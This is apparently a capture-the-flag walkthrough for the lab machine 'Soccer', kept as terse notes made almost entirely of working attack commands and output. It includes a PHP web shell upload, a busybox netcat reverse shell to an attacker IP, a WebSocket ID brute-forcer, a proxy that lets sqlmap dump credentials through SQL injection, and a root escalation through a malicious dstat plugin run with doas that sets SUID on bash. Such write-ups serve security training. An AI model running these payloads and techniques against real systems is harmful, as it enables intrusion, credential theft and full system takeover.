# Soccer

sudo nmap -sCV 10.129.15.105
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-06-16 22:26 EDT
Nmap scan report for 10.129.15.105
Host is up (0.0069s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|*http-title: Did not follow redirect to [http://soccer.htb/](http://soccer.htb/)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Wed, 17 Jun 2026 02:26:41 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Wed, 17 Jun 2026 02:26:41 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|*    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at [https://nmap.org/cgi-bin/submit.cgi?new-service](https://nmap.org/cgi-bin/submit.cgi?new-service) :
SF-Port9091-TCP:V=7.95%I=7%D=6/16%Time=6A3205DC%P=x86_64-pc-linux-gnu%r(in
SF:formix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\
SF:nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Op
SF:tions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCo
SF:ntent-Length:\x20139\r\nDate:\x20Wed,\x2017\x20Jun\x202026\x2002:26:41\
SF:x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang
SF:=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</
SF:head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HT
SF:TPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Pol
SF:icy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\
SF:r\nDate:\x20Wed,\x2017\x20Jun\x202026\x2002:26:41\x20GMT\r\nConnection:
SF:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<me
SF:ta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>C
SF:annot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HT
SF:TP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-s
SF:rc\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20
SF:text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Wed,\
SF:x2017\x20Jun\x202026\x2002:26:41\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"u
SF:tf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\
SF:x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
SF:r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

sudo nmap -p- -T5 10.129.15.105
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-06-16 22:26 EDT
Nmap scan report for 10.129.15.105
Host is up (0.0078s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9091/tcp open  xmltec-xmlmail

gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u [http://soccer.htb](http://soccer.htb/) -t 100

/tiny                 (Status: 301) [Size: 178] [--> [http://soccer.htb/tiny/](http://soccer.htb/tiny/)]

![image.png](Soccer/image.png)

![image.png](Soccer/image%201.png)

default creds admin:admin@123

cat shell.php
<?php system($_GET['cmd']); ?>

![image.png](Soccer/image%202.png)

![image.png](Soccer/image%203.png)

nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.15.105 45712
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[http://soccer.htb/tiny/uploads/shell.php?cmd=busybox%20nc%2010.10.15.206%204444%20-e%20/bin/bash](http://soccer.htb/tiny/uploads/shell.php?cmd=busybox%20nc%2010.10.15.206%204444%20-e%20/bin/bash)

Hosts File Information (T1016,T1018)
Contents of /etc/hosts:
127.0.0.1	localhost	soccer	soccer.htb	soc-player.soccer.htb
127.0.1.1	ubuntu-focal	ubuntu-focal

Doas binary found at: /usr/local/bin/doas
Doas binary has SUID bit set!
-rwsr-xr-x 1 root root 42224 Nov 17  2022 /usr/local/bin/doas
-e
Checking doas.conf files:
Found: /usr/local/bin/../etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
Found: /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat

make account on soccer.htb

make a post request to 

- [ ]  fuzz id parameter

websocat --insecure ws://soc-player.soccer.htb:9091 -v
[INFO  websocat::lints] Auto-inserting the line mode
[INFO  websocat::stdio_threaded_peer] get_stdio_peer (threaded)
[INFO  websocat::ws_client_peer] get_ws_client_peer
[INFO  websocat::net_peer] Connected to TCP 10.129.15.105:9091
[INFO  websocat::ws_client_peer] Connected to ws, response headers: Headers { Upgrade: websocket
, Connection: Upgrade
, Sec-WebSocket-Accept: 7PL6vKQHDq4YcRwjwstIdNCPhAs=
, }
80681
Ticket Doesn't Exist
{"id":"80681"}
Ticket Exists

It’s boolean. Exists or doesn’t

cat [valid.py](http://valid.py/)
#!/usr/bin/env python3
import json
from websocket import create_connection

WS_URL = "ws://soc-player.soccer.htb:9091"
TRUE_MARKER = "Ticket Exists"

valid = []
for i in range(00000, 99999):
try:
ws = create_connection(WS_URL, timeout=5)
ws.send(json.dumps({"id": str(i)}))
resp = ws.recv().strip()
ws.close()
if TRUE_MARKER in resp and "Doesn't" not in resp:
print(f"[+] {i} -> {resp}")
valid.append(i)
except Exception as e:
print(f"[!] {i} errored: {e}")

print(f"\nDone. {len(valid)} valid IDs: {valid}")

python3 [valid.py](http://valid.py/)
[+] 1324 -> Ticket Exists

websocat --insecure ws://soc-player.soccer.htb:9091 -v
[INFO  websocat::lints] Auto-inserting the line mode
[INFO  websocat::stdio_threaded_peer] get_stdio_peer (threaded)
[INFO  websocat::ws_client_peer] get_ws_client_peer
[INFO  websocat::net_peer] Connected to TCP 10.129.15.105:9091
[INFO  websocat::ws_client_peer] Connected to ws, response headers: Headers { Upgrade: websocket
, Connection: Upgrade
, Sec-WebSocket-Accept: ZrGRah3WurKvVSX/W3Qw6sJFlfs=
, }
{"id":"80681"} AND '1'='1"
Ticket Doesn't Exist
{"id":"1324"}
Ticket Exists
{"id":"1324"} AND '1'='1"
Ticket Doesn't Exist
help
Ticket Doesn't Exist
{"id":"1324 AND '1'='1'"}
Ticket Exists

confirmed sql injection. set up a bridge proxy on port 8081

cat ../ws_bridge.py
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import json
from websocket import create_connection

WS_URL = "ws://soc-player.soccer.htb:9091"

class Handler(BaseHTTPRequestHandler):
def do_GET(self):
idv = parse_qs(urlparse(self.path).query).get("id", [""])[0]
ws = create_connection(WS_URL)
ws.send(json.dumps({"id": idv}))
resp = ws.recv()
ws.close()
self.send_response(200)
self.end_headers()
self.wfile.write(resp.encode())

```
def log_message(self, *a):
    pass
```

HTTPServer(("127.0.0.1", 8081), Handler).serve_forever()

python3 ws_bridge.py

sqlmap -u "[http://127.0.0.1:8081/?id=1](http://127.0.0.1:8081/?id=1)" -p id \
--dbms=mysql --batch --level=3 --risk=3 \
--string="Ticket Exists" --dump

+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+

player:PlayerOftheMatch2022

ssh player@soccer.htb

player@soccer:~$ id
uid=1001(player) gid=1001(player) groups=1001(player)
player@soccer:~$ hostname
soccer
player@soccer:~$ cat user.txt
28c76c09b0d807e63a3a14cc2e55a581

[https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-dstat-privilege-escalation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-dstat-privilege-escalation)

find / -type d -name dstat 2>/dev/null

/usr/local/etc/doas.conf

cat dstat_exploit.py

import os

os.system('chmod +s /usr/bin/bash')

player@soccer:/usr/local/share/dstat$ dstat --list | grep exploit
exploit
player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --exploit
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
import imp
Module dstat_exploit failed to load. (name 'dstat_plugin' is not defined)
None of the stats you selected are available.
player@soccer:/usr/local/share/dstat$ bash -p
bash-5.0# id
uid=1001(player) gid=1001(player) euid=0(root) egid=0(root) groups=0(root),1001(player)
bash-5.0# cat /root/root.txt
da6b3d039c0b0f579a29b58eac1d3594